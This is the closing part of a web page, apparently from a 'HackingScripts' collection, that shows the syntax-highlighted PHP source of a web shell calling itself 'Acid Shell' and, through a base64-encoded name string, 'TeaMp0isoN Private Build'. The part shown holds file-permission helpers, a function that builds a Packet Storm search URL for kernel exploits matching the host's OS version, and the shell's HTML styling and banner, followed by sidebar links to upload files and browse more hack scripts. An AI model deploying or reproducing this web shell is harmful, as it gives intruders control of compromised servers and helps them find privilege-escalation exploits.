      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;l&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;b&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;c&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span><span class="p">;}</span>
      <span class="k">else</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;}</span>
      <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00400</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00200</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00100</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span>
      <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00040</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00020</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00010</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span>
      <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00004</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00002</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00001</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;t&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$t</span><span class="p">,</span><span class="s2">&quot;o&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$o</span><span class="p">,</span><span class="s2">&quot;g&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$g</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$w</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">parsesort</span><span class="p">(</span><span class="nv">$sort</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$one</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$sort</span><span class="p">);</span>
      <span class="nv">$second</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sort</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$second</span> <span class="o">!=</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$second</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;}</span>
      <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$one</span><span class="p">,</span><span class="nv">$second</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">view_perms_color</span><span class="p">(</span><span class="nv">$o</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;&amp;lt;font color=white&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;&amp;lt;font color=green&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">str2mini</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="nv">$len</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$len</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="nv">$len</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
        <span class="k">return</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="nv">$len</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;...&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="o">-</span><span class="nv">$len</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$content</span><span class="p">;}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">strips</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$arr</span><span class="p">,</span><span class="nv">$k</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$arr</span><span class="p">))</span> <span class="p">{</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$k</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;GLOBALS&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nx">strips</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="s2">&quot;</span><span class="si">$k</span><span class="s2">&quot;</span><span class="p">]);</span> <span class="p">}</span> <span class="p">}</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span> <span class="p">}</span>
    <span class="p">}</span>
     
    <span class="k">function</span> <span class="nf">getmicrotime</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">list</span><span class="p">(</span><span class="nv">$usec</span><span class="p">,</span> <span class="nv">$sec</span><span class="p">)</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="nb">microtime</span><span class="p">());</span>
      <span class="k">return</span> <span class="p">((</span><span class="nx">float</span><span class="p">)</span><span class="nv">$usec</span> <span class="o">+</span> <span class="p">(</span><span class="nx">float</span><span class="p">)</span><span class="nv">$sec</span><span class="p">);</span>
    <span class="p">}</span>
     
    <span class="k">function</span> <span class="nf">milw0rm</span><span class="p">()</span> <span class="p">{</span>
      <span class="nv">$Lversion</span> <span class="o">=</span> <span class="nb">php_uname</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span>
      <span class="nv">$OSV</span> <span class="o">=</span> <span class="nb">php_uname</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
      <span class="k">if</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;Linux&quot;</span><span class="p">,</span><span class="nv">$OSV</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$Lversion</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$Lversion</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
        <span class="k">return</span> <span class="s2">&quot;http://packetstormsecurity.org/search/?q=Linux Kernel &quot;</span><span class="o">.</span><span class="nv">$Lversion</span><span class="p">;</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$Lversion</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$Lversion</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
        <span class="k">return</span> <span class="s2">&quot;http://packetstormsecurity.org/search/?q=&quot;</span><span class="o">.</span><span class="nv">$OSV</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$Lversion</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
     
       
    <span class="k">function</span> <span class="nf">sh_name</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s2">&quot;VGVhTXAwaXNvTiBQcml2YXRlIEJ1aWxkIFsgQkVUQSBd&quot;</span><span class="p">);</span> <span class="p">}</span>
    <span class="k">function</span> <span class="nf">htmlhead</span><span class="p">(</span><span class="nv">$safemode</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$style</span> <span class="o">=</span> <span class="s1">&#39;</span>
<span class="s1">    &amp;lt;style type=&quot;text/css&quot;&amp;gt;</span>
<span class="s1">    body,table {font:8pt verdana;background-color:black;}</span>
<span class="s1">    table {width:100%;}</span>
<span class="s1">    table,td,#maininfo td {padding:3px;}</span>
<span class="s1">    table,td,input,select,option {border:1px solid #808080;}</span>
<span class="s1">    body,table,input,select,option {color:#FFFFFF;}</span>
<span class="s1">    a {color:lightblue;text-decoration:none; } a:link {color:#5B5BFF;} a:hover {text-decoration:underline;} a:visited {color:#99CCFF;}</span>
<span class="s1">    textarea {color:#dedbde;font:8pt Courier New;border:1px solid #666666;margin:2;}</span>
<span class="s1">    #pagebar {padding:5px;border:3px solid #1E1E1E;border-collapse:collapse;}</span>
<span class="s1">    #pagebar td {vertical-align:top;}</span>
<span class="s1">    #pagebar,#pagebar p,.info,input,select,option {font:8pt tahoma;}</span>
<span class="s1">    #pagebar a {font-weight:bold;color:orange;}</span>
<span class="s1">    #pagebar a:visited {color:#000000;}</span>
<span class="s1">    #mainmenu {text-align:center;}</span>
<span class="s1">    #mainmenu a {text-align: center;padding: 0px 5px 0px 5px;}</span>
<span class="s1">    #maininfo,.barheader,.bartitle {text-align:center;}</span>
<span class="s1">    .fleft {float:left;text-align:left;}</span>
<span class="s1">    .fright {float:right;text-align:right;}</span>
<span class="s1">    .bartitle {padding:5px;border:2px solid #000000;}</span>
<span class="s1">    .barheader {font-weight:bold;padding:5px;}</span>
<span class="s1">    .info,.info td,.info th {margin:0;padding:0;border-collapse:collapse;}</span>
<span class="s1">    .info th {color:orange;text-align:left;width:13%;}</span>
<span class="s1">    .contents,.explorer {border-collapse:collapse;}</span>
<span class="s1">    .contents,.explorer td,th {vertical-align:top;}</span>
<span class="s1">    .mainpanel {border-collapse:collapse;padding:5px;}</span>
<span class="s1">    .barheader,.mainpanel table,td {border:1px solid #333333;}</span>
<span class="s1">    input[type=&quot;submit&quot;],input[type=&quot;button&quot;] {border:1px solid #000000;}</span>
<span class="s1">    input[type=&quot;text&quot;] {padding:3px;}</span>
<span class="s1">    .shell {background-color:#000000;color:orange;padding:5px;font-size:12;}</span>
<span class="s1">    .fxerrmsg {color:red; font-weight:bold;}</span>
<span class="s1">    #pagebar,#pagebar p,h1,h2,h3,h4,form {margin:0;}</span>
<span class="s1">    #pagebar,.mainpanel,input[type=&quot;submit&quot;],input[type=&quot;button&quot;] {background-color:#000000;}</span>
<span class="s1">    .bartitle,input,select,option,input[type=&quot;submit&quot;]:hover,input[type=&quot;button&quot;]:hover {background-color:#333333;}</span>
<span class="s1">    textarea,#pagebar input[type=&quot;text&quot;],.mainpanel input[type=&quot;text&quot;],input[type=&quot;file&quot;],select,option {background-color:#000000;}</span>
<span class="s1">    input[type=&quot;label&quot;] { text-align:right;}</span>
<span class="s1">    .info,.info td,input[type=&quot;label&quot;] {border:0;background:none;}</span>
<span class="s1">    &amp;lt;/style&amp;gt;</span>
<span class="s1">    &#39;</span><span class="p">;</span>
    <span class="nv">$html_start</span> <span class="o">=</span> <span class="s1">&#39;</span>
<span class="s1">    &amp;lt;html&amp;gt;&amp;lt;head&amp;gt;</span>
<span class="s1">    &amp;lt;title&amp;gt;&#39;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; - &#39;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/title&amp;gt;</span>
<span class="s1">    &#39;</span><span class="o">.</span><span class="nv">$style</span><span class="o">.</span><span class="s1">&#39;</span>
<span class="s1">    &amp;lt;/head&amp;gt;</span>
<span class="s1">    &amp;lt;body&amp;gt;</span>
<span class="s1">    &amp;lt;center&amp;gt;&amp;lt;img src=&quot;http://s019.radikal.ru/i642/1301/8b/4b8d2f31486f.png&quot; alt=&quot;ShellBanner&quot;&amp;gt;&amp;lt;/center&amp;gt;</span>
<span class="s1">    &#39;</span><span class="p">;</span>
    <span class="k">return</span> <span class="nv">$html_start</span><span class="p">;</span>
    <span class="p">};</span>
    <span class="k">function</span> <span class="nf">footer</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=bartitle colspan=2&amp;gt;&amp;lt;font size=2 color=#00FF00&amp;gt;&amp;lt;b&amp;gt; [ Acid ] Shell -  #Version 1! [PRIV4TE] -; Generated: &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nx">getmicrotime</span><span class="p">()</span><span class="o">-</span><span class="nx">starttime</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; seconds&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nb">chdir</span><span class="p">(</span><span class="nv">$lastdir</span><span class="p">);</span> <span class="nx">tpshexit</span><span class="p">();</span>
    <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
